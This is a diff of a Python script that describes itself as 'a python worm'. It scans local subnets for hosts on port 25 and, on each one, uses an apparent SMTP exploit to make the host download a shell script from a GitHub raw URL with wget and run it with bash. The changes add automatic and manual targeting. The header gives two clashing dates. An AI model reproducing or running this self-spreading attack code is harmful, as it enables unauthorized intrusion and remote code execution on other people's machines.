@@ -2,15 +2,13 @@
 # Date: 2020-01-29
 # Exploit Author: 1F98D
 # Date: 2022
-with open('/tmp/sneed', 'w') as fout:
-	 fout.write('sneed harder')
-	 
 	 
 from socket import *
 import sys
 import time
 import subprocess
 import re
+import argparse
 
 def find_subnets():
 	ifconfig = subprocess.check_output(['/usr/sbin/ifconfig'], text = True)
@@ -38,8 +36,8 @@ def find_subnets():
 
 	return nmap_result.keys() # return the resolution of ips that are up
 	
-for ADDR in find_subnets():
-		PORT = 25
+def attack(nmap_res: list, PORT: int):
+	for ADDR in nmap_res:
 		print("Attacking: "+ ADDR + " " + str(PORT))
 		CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
 
@@ -84,6 +82,23 @@ for ADDR in find_subnets():
 				s.recv(1024)
 				print('[*] Done')
 				time.sleep(3)
+				
 			except ConnectionRefusedError and OSError:
 				print("Connection error.")
+				
+				
+						
+def main():
+	parser = argparse.ArgumentParser(description='A python worm.')
+	parser.add_argument("-ma", "--manual", help="Set the IP and Port of the target manually.", nargs = '*')
+	args = parser.parse_args()
+	if args.manual != None: # check if there are arguments, if so activate manualy
+		target = []
+		target.append(args.manual[0])
+		attack(target, int(args.manual[1]))
+	else:
+		attack(find_subnets(), 25)  # auto attack
+
+if __name__ == "__main__":
+	main()
 
